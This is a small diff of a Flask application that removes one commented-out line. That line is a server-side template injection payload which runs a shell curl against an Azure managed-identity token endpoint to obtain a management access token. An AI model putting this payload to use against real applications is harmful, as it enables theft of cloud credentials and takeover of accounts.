@@ -26,7 +26,6 @@ def hello():
    else:
        return redirect(url_for('index'))
 
-# {{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl "http://169.254.131.5:8081/msi/token?api-version=2017-09-01&resource=https://management.azure.com" -H secret:"922c26e8-8192-4036-a6b9-0b3d8656416c"').read() }}
 
 if __name__ == '__main__':
    app.run()
